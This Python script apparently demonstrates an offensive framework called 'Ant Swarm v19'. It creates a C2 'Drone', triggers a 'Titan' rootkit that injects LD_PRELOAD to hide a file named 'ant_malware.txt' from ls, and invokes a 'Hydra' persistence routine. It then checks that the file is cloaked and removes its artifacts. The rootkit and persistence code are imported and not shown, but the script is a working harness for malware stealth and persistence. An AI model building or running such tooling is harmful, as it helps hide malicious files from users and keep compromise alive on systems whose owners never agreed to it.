#!/usr/bin/env python3
import os
import time
import subprocess
from rich.console import Console
from rich.panel import Panel
from ant_swarm.c2.drone import Drone

console = Console()

def main():
    console.print(Panel("[bold red]ANT SWARM v19: TITAN ROOTKIT & HYDRA PERSISTENCE[/]", expand=False))

    # 1. Setup Test Environment
    console.print("\n[SCENARIO] 🏗️ Creating Malware Artifacts...")
    with open("ant_malware.txt", "w") as f:
        f.write("SECRET DATA")

    # Verify visibility BEFORE rootkit
    ls_out = subprocess.getoutput("ls ant_malware.txt")
    if "ant_malware.txt" in ls_out:
        console.print("[SCENARIO] ✅ File is visible (Normal State).")
    else:
        console.print("[SCENARIO] ❌ Error: Setup failed.")

    # 2. Deploy Drone (Simulated Infection)
    console.print("\n[SCENARIO] 🚀 Deploying Drone with Titan Rootkit...")
    drone = Drone(c2_url="http://localhost:8080") # C2 not needed for this local rootkit test

    # Manual Trigger of Rootkit Deploy for Demo (skipping C2 loop)
    drone.titan.deploy()
    drone.hydra.persist()

    # 3. Verify Cloaking (LD_PRELOAD)
    console.print("\n[SCENARIO] 👻 Verifying File Cloaking...")
    # We must run 'ls' with the modified environment
    env = os.environ.copy() # Titan modifies os.environ in current process

    # Check if LD_PRELOAD is set
    if "LD_PRELOAD" in env:
        console.print(f"[TITAN] 💉 Env Check: LD_PRELOAD={env['LD_PRELOAD']}")

        # Run ls
        # Note: In this sandbox, gcc might fail or LD_PRELOAD might be restricted.
        # We check if the .so exists first.
        if os.path.exists("libtitan.so"):
            try:
                # We spawn a subprocess with the env.
                # If rootkit works, 'ls' should NOT show 'ant_malware.txt'
                cloaked_ls = subprocess.getoutput(f"LD_PRELOAD={env['LD_PRELOAD']} ls")
                if "ant_malware.txt" not in cloaked_ls:
                    console.print("[SCENARIO] 🏆 SUCCESS: 'ant_malware.txt' is HIDDEN from ls!")
                else:
                    console.print("[SCENARIO] ⚠️ PARTIAL FAIL: Rootkit loaded but file visible (LD_PRELOAD limitations in sandbox?).")
            except:
                console.print("[SCENARIO] ⚠️ Execution Error.")
        else:
            console.print("[SCENARIO] ❌ Compilation Failed (No gcc?).")
    else:
        console.print("[SCENARIO] ❌ Rootkit failed to inject environment.")

    # 4. Cleanup
    if os.path.exists("ant_malware.txt"): os.remove("ant_malware.txt")
    if os.path.exists("titan_hook.c"): os.remove("titan_hook.c")
    if os.path.exists("libtitan.so"): os.remove("libtitan.so")

if __name__ == "__main__":
    main()
